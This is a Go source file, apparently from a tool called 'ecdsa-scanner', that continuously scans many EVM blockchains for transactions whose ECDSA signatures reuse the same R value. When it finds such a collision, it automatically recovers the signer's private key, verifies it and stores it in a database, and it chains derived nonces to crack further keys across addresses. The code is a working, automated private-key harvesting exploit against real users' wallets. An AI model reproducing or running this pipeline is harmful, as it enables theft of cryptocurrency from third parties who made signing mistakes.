package scanner

import (
	"context"
	"fmt"
	"math/big"
	"strings"
	"sync"
	"time"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/common/hexutil"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/ethereum/go-ethereum/rpc"

	"ecdsa-scanner/internal/config"
	"ecdsa-scanner/internal/db"
	"ecdsa-scanner/internal/logger"
	"ecdsa-scanner/internal/notify"
	"ecdsa-scanner/internal/recovery"
)

// RPCTransaction represents a transaction from the RPC
type RPCTransaction struct {
	Hash string `json:"hash"`
	From string `json:"from"`
	R    string `json:"r"`
	S    string `json:"s"`
	V    string `json:"v"`
}

// RPCBlock represents a block from the RPC
type RPCBlock struct {
	Number       string           `json:"number"`
	Transactions []RPCTransaction `json:"transactions"`
}

// CollisionEvent is sent when a collision is detected
type CollisionEvent struct {
	RValue      string
	NewTxHash   string
	NewChainID  int
	NewAddress  string
	FirstTxRef  db.TxRef
}

// ChainStats holds statistics for a single chain
type ChainStats struct {
	Chain        string `json:"chain"`
	ChainID      int    `json:"chain_id"`
	CurrentBlock uint64 `json:"current_block"`
	LatestBlock  uint64 `json:"latest_block"`
	Running      bool   `json:"running"`
	ErrorCount   int    `json:"error_count"`
}

// ChainScanner handles scanning for a single chain
type ChainScanner struct {
	config          config.ChainConfig
	client          *rpc.Client
	ethClient       *ethclient.Client
	running         bool
	stopChan        chan struct{}
	mu              sync.Mutex
	stats           ChainStats
	errCount        int
	lastNewBlockAt  time.Time     // when we last saw a new block from the chain
	estBlockTime    time.Duration // estimated block time based on observations
}

// Scanner coordinates scanning across all chains
type Scanner struct {
	db              db.Database
	logger          *logger.Logger
	notifier        *notify.Notifier
	chainScanners   map[int]*ChainScanner // keyed by chainID
	mu              sync.RWMutex
	collisionChan   chan CollisionEvent
	recoveryEnabled bool
	ankrAPIKey      string
	systemAddresses map[string]bool
}

// New creates a new Scanner
func New(database db.Database, log *logger.Logger, ankrAPIKey string, notifier *notify.Notifier) (*Scanner, error) {
	s := &Scanner{
		db:              database,
		logger:          log,
		notifier:        notifier,
		chainScanners:   make(map[int]*ChainScanner),
		collisionChan:   make(chan CollisionEvent, 10000),
		recoveryEnabled: true,
		ankrAPIKey:      ankrAPIKey,
		systemAddresses: config.SystemAddresses(),
	}

	// Start collision processors (multiple workers to handle RPC latency)
	for i := 0; i < 5; i++ {
		go s.processCollisions()
	}

	// Initialize chain scanners
	for _, cfg := range config.DefaultChains() {
		if !cfg.Enabled {
			continue
		}

		rpcURL := s.buildRPCURL(cfg.RPCURL)
		client, err := rpc.Dial(rpcURL)
		if err != nil {
			log.Warn("[%s] Failed to connect: %v", cfg.Name, err)
		}

		var ethClient *ethclient.Client
		if client != nil {
			ethClient = ethclient.NewClient(client)
		}

		s.chainScanners[cfg.ChainID] = &ChainScanner{
			config:    cfg,
			client:    client,
			ethClient: ethClient,
			stopChan:  make(chan struct{}),
			stats:     ChainStats{Chain: cfg.Name, ChainID: cfg.ChainID},
		}
		if client != nil {
			log.Info("[%s] Initialized scanner (chainID=%d)", cfg.Name, cfg.ChainID)
		}
	}

	return s, nil
}

func (s *Scanner) buildRPCURL(baseURL string) string {
	if s.ankrAPIKey != "" && strings.Contains(baseURL, "ankr.com") {
		return baseURL + "/" + s.ankrAPIKey
	}
	return baseURL
}

// StartAll starts all chain scanners
func (s *Scanner) StartAll() {
	for chainID := range s.chainScanners {
		s.StartChain(chainID)
		time.Sleep(500 * time.Millisecond)
	}
}

// StopAll stops all chain scanners
func (s *Scanner) StopAll() {
	for chainID := range s.chainScanners {
		s.StopChain(chainID)
	}
}

// StartChain starts a specific chain scanner
func (s *Scanner) StartChain(chainID int) {
	cs, ok := s.chainScanners[chainID]
	if !ok {
		return
	}

	cs.mu.Lock()
	if cs.running {
		cs.mu.Unlock()
		return
	}
	cs.running = true
	cs.stopChan = make(chan struct{})
	cs.mu.Unlock()

	go s.scanLoop(cs)
}

// StopChain stops a specific chain scanner
func (s *Scanner) StopChain(chainID int) {
	cs, ok := s.chainScanners[chainID]
	if !ok {
		return
	}

	cs.mu.Lock()
	if !cs.running {
		cs.mu.Unlock()
		return
	}
	cs.running = false
	close(cs.stopChan)
	cs.mu.Unlock()
}

// GetChainStats returns statistics for all chains
func (s *Scanner) GetChainStats() []ChainStats {
	var stats []ChainStats
	for _, cs := range s.chainScanners {
		cs.mu.Lock()
		st := cs.stats
		st.Running = cs.running
		st.ErrorCount = cs.errCount
		cs.mu.Unlock()
		stats = append(stats, st)
	}
	return stats
}

func (s *Scanner) scanLoop(cs *ChainScanner) {
	ctx := context.Background()
	chainName := cs.config.Name
	chainID := cs.config.ChainID

	if cs.client == nil {
		if err := s.reconnect(cs); err != nil {
			s.logger.Error("[%s] Failed to connect: %v", chainName, err)
			return
		}
	}

	// Get last scanned block
	lastBlock, _ := s.db.GetLastBlock(ctx, chainID)
	if lastBlock == 0 {
		latestBlock, err := s.getLatestBlock(cs, ctx)
		if err != nil {
			s.logger.Error("[%s] Failed to get latest block: %v", chainName, err)
			return
		}
		lastBlock = latestBlock - 1000
	}

	s.logger.Info("[%s] Starting scan from block %d", chainName, lastBlock+1)

	for {
		select {
		case <-cs.stopChan:
			s.logger.Info("[%s] Scanner stopped", chainName)
			return
		default:
		}

		latestBlock, err := s.getLatestBlock(cs, ctx)
		if err != nil {
			cs.mu.Lock()
			cs.errCount++
			cs.mu.Unlock()
			time.Sleep(5 * time.Second)
			continue
		}

		cs.mu.Lock()
		prevLatest := cs.stats.LatestBlock
		cs.stats.LatestBlock = latestBlock
		cs.mu.Unlock()

		// Track when chain produces new blocks to estimate block time
		if latestBlock > prevLatest && prevLatest > 0 {
			now := time.Now()
			cs.mu.Lock()
			if !cs.lastNewBlockAt.IsZero() {
				observed := now.Sub(cs.lastNewBlockAt) / time.Duration(latestBlock-prevLatest)
				if cs.estBlockTime == 0 {
					cs.estBlockTime = observed
				} else {
					// Exponential moving average (0.3 weight for new observation)
					cs.estBlockTime = (cs.estBlockTime*7 + observed*3) / 10
				}
			}
			cs.lastNewBlockAt = now
			cs.mu.Unlock()
		}

		if lastBlock >= latestBlock {
			// Caught up - wait based on estimated block time
			cs.mu.Lock()
			waitTime := cs.estBlockTime
			cs.mu.Unlock()
			if waitTime < 500*time.Millisecond {
				waitTime = 500 * time.Millisecond
			}
			if waitTime > 15*time.Second {
				waitTime = 15 * time.Second
			}
			time.Sleep(waitTime)
			continue
		}

		nextBlock := lastBlock + 1
		if err := s.scanBlock(cs, ctx, nextBlock); err != nil {
			cs.mu.Lock()
			cs.errCount++
			cs.mu.Unlock()
			s.logger.Error("[%s] Failed to scan block %d: %v", chainName, nextBlock, err)
			time.Sleep(2 * time.Second)
			continue
		}

		cs.mu.Lock()
		cs.stats.CurrentBlock = nextBlock
		cs.mu.Unlock()

		lastBlock = nextBlock

		if nextBlock%100 == 0 {
			s.db.SaveLastBlock(ctx, chainID, nextBlock)
		}

		if nextBlock%1000 == 0 {
			s.logger.Info("[%s] Block %d, %d behind", chainName, nextBlock, latestBlock-nextBlock)
		}

		// Dynamic rate limiting: slow down when nearly caught up
		blocksBehind := latestBlock - nextBlock
		if blocksBehind < 2 {
			cs.mu.Lock()
			waitTime := cs.estBlockTime
			cs.mu.Unlock()
			if waitTime < 500*time.Millisecond {
				waitTime = 500 * time.Millisecond
			}
			if waitTime > 15*time.Second {
				waitTime = 15 * time.Second
			}
			time.Sleep(waitTime)
		} else {
			// Catching up - minimal delay
			time.Sleep(50 * time.Millisecond)
		}
	}
}

func (s *Scanner) reconnect(cs *ChainScanner) error {
	rpcURL := s.buildRPCURL(cs.config.RPCURL)
	client, err := rpc.Dial(rpcURL)
	if err != nil {
		return err
	}

	cs.mu.Lock()
	if cs.client != nil {
		cs.client.Close()
	}
	cs.client = client
	cs.ethClient = ethclient.NewClient(client)
	cs.mu.Unlock()

	s.logger.Info("[%s] Reconnected", cs.config.Name)
	return nil
}

func (s *Scanner) getLatestBlock(cs *ChainScanner, ctx context.Context) (uint64, error) {
	if cs.client == nil {
		return 0, fmt.Errorf("no client")
	}

	ctx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	var blockNum hexutil.Big
	if err := cs.client.CallContext(ctx, &blockNum, "eth_blockNumber"); err != nil {
		return 0, err
	}
	return (*big.Int)(&blockNum).Uint64(), nil
}

func (s *Scanner) scanBlock(cs *ChainScanner, ctx context.Context, blockNum uint64) error {
	if cs.client == nil {
		return fmt.Errorf("no client")
	}

	ctx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	var block RPCBlock
	blockNumHex := fmt.Sprintf("0x%x", blockNum)
	if err := cs.client.CallContext(ctx, &block, "eth_getBlockByNumber", blockNumHex, true); err != nil {
		return err
	}

	// Collect all valid transactions for batch processing
	var txInputs []db.TxInput
	for _, tx := range block.Transactions {
		if tx.R == "" || tx.R == "0x0" || tx.From == "" {
			continue
		}
		if s.systemAddresses[strings.ToLower(tx.From)] {
			continue
		}
		txInputs = append(txInputs, db.TxInput{
			RValue:  strings.ToLower(tx.R),
			TxHash:  strings.ToLower(tx.Hash),
			ChainID: cs.config.ChainID,
			Address: strings.ToLower(tx.From),
		})
	}

	if len(txInputs) == 0 {
		return nil
	}

	// Batch check and insert all R values
	collisions, err := s.db.BatchCheckAndInsertRValues(ctx, txInputs)
	if err != nil {
		s.logger.Warn("[%s] DB batch error: %v", cs.config.Name, err)
		return err
	}

	// Queue collisions for processing
	for _, c := range collisions {
		select {
		case s.collisionChan <- CollisionEvent{
			RValue:     c.RValue,
			NewTxHash:  c.TxHash,
			NewChainID: c.ChainID,
			NewAddress: c.Address,
			FirstTxRef: c.FirstTxRef,
		}:
		default:
			s.logger.Warn("Collision queue full")
		}
	}

	return nil
}

// processCollisions handles detected collisions
func (s *Scanner) processCollisions() {
	for event := range s.collisionChan {
		if !s.recoveryEnabled {
			continue
		}
		s.handleCollision(event)
	}
}

func (s *Scanner) handleCollision(event CollisionEvent) {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	s.logger.Info("[COLLISION] R=%s... TX1=%s (chain %d) TX2=%s (chain %d)",
		event.RValue[:18], event.FirstTxRef.TxHash[:18], event.FirstTxRef.ChainID,
		event.NewTxHash[:18], event.NewChainID)

	// Fetch full transaction data from RPC
	tx1Data, err := s.fetchTxData(ctx, event.FirstTxRef.TxHash, event.FirstTxRef.ChainID)
	if err != nil {
		s.logger.Error("[COLLISION] Failed to fetch TX1: %v", err)
		return
	}

	tx2Data, err := s.fetchTxData(ctx, event.NewTxHash, event.NewChainID)
	if err != nil {
		s.logger.Error("[COLLISION] Failed to fetch TX2: %v", err)
		return
	}

	// Check if same address (same-key reuse - directly recoverable)
	isSameKey := strings.EqualFold(tx1Data.From, tx2Data.From)

	// Send collision notification
	if err := s.notifier.NotifyCollision(event.RValue, tx2Data.From, event.NewChainID, isSameKey); err != nil {
		s.logger.Warn("[NOTIFY] Failed to send collision notification: %v", err)
	}

	if isSameKey {
		s.logger.Info("[COLLISION] Same-key reuse detected for %s", tx1Data.From)
		s.attemptSameKeyRecovery(ctx, event, tx1Data, tx2Data)
		return
	}

	// Cross-key collision - check if we have a known nonce
	knownNonce, err := s.db.GetRecoveredNonce(ctx, event.RValue)
	if err == nil {
		s.logger.Info("[COLLISION] Cross-key with known nonce - attempting recovery")
		s.attemptCrossKeyRecoveryWithKnownNonce(ctx, event, tx2Data, knownNonce)
		return
	}

	// Cross-key without known nonce - save as pending
	s.logger.Info("[COLLISION] Cross-key collision (not yet solvable)")
	s.savePendingComponent(ctx, event, tx1Data, tx2Data)
}

// TxData holds fetched transaction data needed for recovery
type TxData struct {
	Hash    string
	ChainID int
	From    string
	Z       *big.Int // signing hash
	R       *big.Int
	S       *big.Int
}

func (s *Scanner) fetchTxData(ctx context.Context, txHash string, chainID int) (*TxData, error) {
	chainCfg := config.ChainByID(chainID)
	if chainCfg == nil {
		return nil, fmt.Errorf("unknown chain ID %d", chainID)
	}

	rpcURL := s.buildRPCURL(chainCfg.RPCURL)
	client, err := ethclient.DialContext(ctx, rpcURL)
	if err != nil {
		return nil, err
	}
	defer client.Close()

	tx, _, err := client.TransactionByHash(ctx, common.HexToHash(txHash))
	if err != nil {
		return nil, err
	}

	chainIDBig, err := client.ChainID(ctx)
	if err != nil {
		return nil, err
	}

	signer := types.LatestSignerForChainID(chainIDBig)
	from, err := types.Sender(signer, tx)
	if err != nil {
		return nil, err
	}

	z := signer.Hash(tx)
	v, r, sVal := tx.RawSignatureValues()
	_ = v

	return &TxData{
		Hash:    txHash,
		ChainID: chainID,
		From:    from.Hex(),
		Z:       new(big.Int).SetBytes(z.Bytes()),
		R:       r,
		S:       sVal,
	}, nil
}

func (s *Scanner) attemptSameKeyRecovery(ctx context.Context, event CollisionEvent, tx1, tx2 *TxData) {
	// Check if already recovered
	recovered, _ := s.db.IsKeyRecovered(ctx, tx1.From, tx1.ChainID)
	if recovered {
		s.logger.Info("[RECOVERY] Key already recovered for %s", tx1.From)
		return
	}

	// Recover private key
	privKey, err := recovery.RecoverFromSignatures(tx1.Z, tx1.R, tx1.S, tx2.Z, tx2.R, tx2.S)
	if err != nil {
		s.logger.Error("[RECOVERY] Failed: %v", err)
		return
	}

	// Verify
	if !recovery.VerifyPrivateKey(privKey, tx1.From) {
		s.logger.Error("[RECOVERY] Verification failed - recovered key doesn't match address")
		return
	}

	// Save key
	keyID, err := s.db.SaveRecoveredKey(ctx, &db.RecoveredKey{
		Address:    strings.ToLower(tx1.From),
		PrivateKey: privKey,
		ChainID:    tx1.ChainID,
		ChainName:  config.ChainByID(tx1.ChainID).Name,
		RValues:    []string{event.RValue},
		TxHashes:   []string{tx1.Hash, tx2.Hash},
	})
	if err != nil {
		s.logger.Error("[RECOVERY] Failed to save key: %v", err)
		return
	}

	s.logger.Info("[RECOVERY] *** SUCCESS *** Recovered key for %s", tx1.From)

	// Send push notification
	chainName := ""
	if cfg := config.ChainByID(tx1.ChainID); cfg != nil {
		chainName = cfg.Name
	}
	if err := s.notifier.NotifyKeyRecovered(tx1.From, chainName, 2); err != nil {
		s.logger.Warn("[NOTIFY] Failed to send notification: %v", err)
	}

	// Only save nonce if it can help recover other keys (cross-key potential)
	hasCrossKey, _ := s.db.HasCrossKeyPotential(ctx, event.RValue, tx1.From)
	if hasCrossKey {
		nonce := recovery.DeriveNonce(tx1.Z, tx1.R, tx1.S, privKey)
		s.db.SaveRecoveredNonce(ctx, &db.RecoveredNonce{
			RValue:           event.RValue,
			KValue:           nonce,
			DerivedFromKeyID: keyID,
		})
		s.logger.Info("[RECOVERY] Saved nonce for cross-key recovery (R=%s...)", event.RValue[:18])

		// Check if this unlocks any pending components
		s.checkPendingComponents(ctx, event.RValue, nonce)
	}
}

func (s *Scanner) attemptCrossKeyRecoveryWithKnownNonce(ctx context.Context, event CollisionEvent, txData *TxData, nonce *db.RecoveredNonce) {
	// Check if already recovered
	recovered, _ := s.db.IsKeyRecovered(ctx, txData.From, txData.ChainID)
	if recovered {
		return
	}

	// Recover using known nonce
	privKey, err := recovery.RecoverWithKnownNonce(txData.Z, txData.R, txData.S, nonce.KValue)
	if err != nil {
		s.logger.Error("[RECOVERY] Cross-key failed: %v", err)
		return
	}

	if !recovery.VerifyPrivateKey(privKey, txData.From) {
		s.logger.Error("[RECOVERY] Cross-key verification failed")
		return
	}

	_, err = s.db.SaveRecoveredKey(ctx, &db.RecoveredKey{
		Address:    strings.ToLower(txData.From),
		PrivateKey: privKey,
		ChainID:    txData.ChainID,
		ChainName:  config.ChainByID(txData.ChainID).Name,
		RValues:    []string{event.RValue},
		TxHashes:   []string{txData.Hash},
	})
	if err != nil {
		s.logger.Error("[RECOVERY] Failed to save key: %v", err)
		return
	}

	s.logger.Info("[RECOVERY] *** SUCCESS (cross-key) *** Recovered key for %s", txData.From)

	// Send push notification
	chainName := ""
	if cfg := config.ChainByID(txData.ChainID); cfg != nil {
		chainName = cfg.Name
	}
	if err := s.notifier.NotifyKeyRecovered(txData.From, chainName, 1); err != nil {
		s.logger.Warn("[NOTIFY] Failed to send notification: %v", err)
	}
}

func (s *Scanner) savePendingComponent(ctx context.Context, event CollisionEvent, tx1, tx2 *TxData) {
	comp := &db.PendingComponent{
		RValues:   []string{event.RValue},
		TxHashes:  []string{tx1.Hash, tx2.Hash},
		Addresses: []string{tx1.From, tx2.From},
		ChainIDs:  []int{tx1.ChainID, tx2.ChainID},
		Equations: 2,
		Unknowns:  3, // 2 keys + 1 nonce
	}
	s.db.SavePendingComponent(ctx, comp)
}

func (s *Scanner) checkPendingComponents(ctx context.Context, rValue string, nonce string) {
	// Check if any pending components use this R value
	comps, err := s.db.GetPendingComponents(ctx)
	if err != nil {
		return
	}

	for _, comp := range comps {
		for _, r := range comp.RValues {
			if r == rValue {
				// This component now has a known nonce
				s.logger.Info("[RECOVERY] Pending component now solvable")
				// TODO: Implement general linear solver
				// For now, we handle simple cases in the collision handler
			}
		}
	}
}

// SetRecoveryEnabled enables/disables automatic recovery
func (s *Scanner) SetRecoveryEnabled(enabled bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.recoveryEnabled = enabled
}

// IsRecoveryEnabled returns whether recovery is enabled
func (s *Scanner) IsRecoveryEnabled() bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.recoveryEnabled
}

// StartChainByName starts a chain scanner by name
func (s *Scanner) StartChainByName(name string) {
	cfg := config.ChainByName(name)
	if cfg != nil {
		s.StartChain(cfg.ChainID)
	}
}

// StopChainByName stops a chain scanner by name
func (s *Scanner) StopChainByName(name string) {
	cfg := config.ChainByName(name)
	if cfg != nil {
		s.StopChain(cfg.ChainID)
	}
}
